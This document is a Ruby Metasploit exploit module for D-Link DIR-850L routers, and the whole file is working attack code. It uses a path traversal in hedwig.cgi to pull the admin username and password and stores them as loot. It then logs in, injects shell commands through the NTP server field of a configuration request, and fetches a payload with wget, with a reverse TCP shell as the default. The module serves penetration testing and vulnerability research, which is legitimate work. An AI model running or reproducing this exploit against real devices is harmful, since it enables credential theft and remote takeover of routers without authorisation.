##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'openssl'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'DIR-850L (Un)authenticated OS Command Exec',
      'Description' => %q{
        This module leverages an unauthenticated credential disclosure
        vulnerability to then execute arbitrary commands on DIR-850L routers
        as an authenticated user. Unable to use Meterpreter payloads.
      },
      'Author' => [
        'Mumbai', # https://github.com/realoriginal (module)
        'Zdenda' # vuln discovery
      ],
      'References' => [
        ['URL', 'https://www.seebug.org/vuldb/ssvid-96333'],
        ['URL', 'https://blogs.securiteam.com/index.php/archives/3310'],
      ],
      'DisclosureDate' => 'Aug 9 2017',
      'License' => MSF_LICENSE,
      'Platform' => 'linux',
      'Arch' => ARCH_MIPSBE,
      'DefaultTarget' => 0,
      'DefaultOptions' => {
        'PAYLOAD' => 'linux/mipsbe/shell/reverse_tcp'
      },
      'Privileged' => true,
      'Payload' => {
        'DisableNops' => true,
      },
      'Targets' => [[ 'Automatic', {} ]],
    ))
  end

  def check
    begin
      res = send_request_cgi({
        'uri' => '/',
        'method' => 'GET'
        })
      if res && res.headers['Server']
        auth = res.headers['Server']
        if auth =~ /DIR-850L/
          if auth =~ /WEBACCESS\/1\.0/
            return Exploit::CheckCode::Safe
          else
            return Exploit::CheckCode::Detected
          end
        end
      end
    rescue ::Rex::ConnectionError
      return Exploit::CheckCode::Unknown
    end
    Exploit::CheckCode::Unknown
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end


  # some other DIR-8X series routers are vulnerable to this same retrieve creds vuln as well...
  # should write an auxiliary module to-do -> WRITE AUXILIARY
  def retrieve_creds
    begin
      xml = "<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n"
      xml << "<postxml>\r\n"
      xml << "<module>\r\n"
      xml << "  <service>../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml</service>\r\n"
      xml << "</module>\r\n"
      xml << "</postxml>"
      res = send_request_cgi({
        'uri' => '/hedwig.cgi',
        'method' => 'POST',
        'encode_params' => false,
        'headers' => {
          'Accept-Encoding' => 'gzip, deflate',
          'Accept' => '*/*'
        },
        'ctype' => 'text/xml',
        'cookie' => "uid=#{Rex::Text.rand_text_alpha_lower(8)}",
        'data' => xml,
      })
      if res.body =~ /<password>(.*)<\/password>/ # fixes stack trace issue
        parse = res.get_xml_document
        username = parse.at('//name').text
        password = parse.at('//password').text
        vprint_good("#{peer} - Retrieved the username/password combo #{username}/#{password}")
        loot = store_loot("dlink.dir850l.login", "text/plain", rhost, res.body)
        print_good("#{peer} - Downloaded credentials to #{loot}")
        return username, password
      else
        fail_with(Failure::NotFound, "#{peer} - Credentials could not be obtained")
      end
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unknown, "#{peer} - Unable to connect to target.")
    end
  end

  def retrieve_uid
    begin
      res = send_request_cgi({
          'uri' => '/authentication.cgi',
          'method' => 'GET',
      })
      parse = res.get_json_document
      uid = parse['uid']
      challenge = parse['challenge']
      return uid, challenge
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unknown, "#{peer} - Unable to connect to target.")
    end
  end

  def login(username, password)
    uid, challenge = retrieve_uid
    begin
      hash = OpenSSL::HMAC.hexdigest(OpenSSL::Digest.new('md5'), password.to_s, (username.to_s + challenge.to_s)).upcase
      send_request_cgi({
        'uri' => '/authentication.cgi',
        'method' => 'POST',
        'data' => "id=#{username}&password=#{hash}",
        'cookie' => "uid=#{uid}"
      })
      return uid
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unknown, "#{peer} - Unable to connect to target.")
    end
  end

  def execute_command(cmd, opts)
    uid = login(@username, @password) # reason being for loop is cause UID expires for some reason after executing 1 command
    payload = "<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n"
    payload << "<postxml>\r\n"
    payload << "<module>\r\n"
    payload << "  <service>DEVICE.TIME</service>\r\n"
    payload << "  <device>\r\n"
    payload << "    <time>\r\n"
    payload << "      <ntp>\r\n"
    payload << "        <enable>1</enable>\r\n"
    payload << "        <period>604800</period>\r\n"
    payload << "        <server>#{Rex::Text.rand_text_alpha_lower(8)}; (#{cmd}&); </server>\r\n"
    payload << "      </ntp>\r\n"
    payload << "      <ntp6>\r\n"
    payload << "        <enable>1</enable>\r\n"
    payload << "        <period>604800</period>\r\n"
    payload << "      </ntp6>\r\n"
    payload << "      <timezone>20</timezone>\r\n"
    payload << "      <time/>\r\n"
    payload << "      <date/>\r\n"
    payload << "      <dst>0</dst>\r\n"
    payload << "      <dstmanual/>\r\n"
    payload << "      <dstoffset/>\r\n"
    payload << "    </time>\r\n"
    payload << "  </device>\r\n"
    payload << "</module>\r\n"
    payload << "</postxml>"
    begin
      # save configuration
      res = send_request_cgi({
        'uri' => '/hedwig.cgi',
        'method' => 'POST',
        'ctype' => 'text/xml',
        'data' => payload,
        'cookie' => "uid=#{uid}"
      })
      # execute configuration
      res = send_request_cgi({
        'uri' => '/pigwidgeon.cgi',
        'method' => 'POST',
        'data' => 'ACTIONS=SETCFG,ACTIVATE',
        'cookie' => "uid=#{uid}"
      })
      return res
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unknown, "#{peer} - Unable to connect to target.")
    end
  end


  def exploit
    print_status("#{peer} - Connecting to target...")

    unless check == Exploit::CheckCode::Detected
      fail_with(Failure::Unknown, "#{peer} - Failed to access vulnerable url")
    end
    #
    # Information Retrieval, obtains creds and logs in
    #
    @username, @password = retrieve_creds
    execute_cmdstager(
      :flavor => :wget,
      :linemax => 200
    )
  end
end